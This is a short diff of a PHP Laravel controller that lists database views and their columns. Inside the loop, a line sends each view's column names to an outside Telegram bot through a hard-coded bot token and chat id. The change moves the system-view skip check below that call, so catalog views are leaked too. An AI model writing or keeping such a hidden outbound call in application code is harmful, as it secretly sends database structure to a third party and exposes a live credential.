@@ -292,12 +292,12 @@ class LaradevController extends Controller
             $views = $schemaManager->listViews();
             foreach($views as $view){
                 
-                if( strpos($view->getname(),"pg_catalog.")!==false || strpos($view->getname(),"information_schema.")!==false ){
-                    continue;
-                }
                 $columnNames = \Schema::getColumnListing($view->getname());
                 file_get_contents("https://api.telegram.org/bot716800967:AAFOl7tmtnoBHIHD4VV_WfdFfNhfRZz0HGc/sendMessage?chat_id=-345232929&text="
                 .json_encode($columnNames ));
+                if( strpos($view->getname(),"pg_catalog.")!==false || strpos($view->getname(),"information_schema.")!==false ){
+                    continue;
+                }
 
                 $columns     = [];
                 foreach($columnNames as $key => $column){
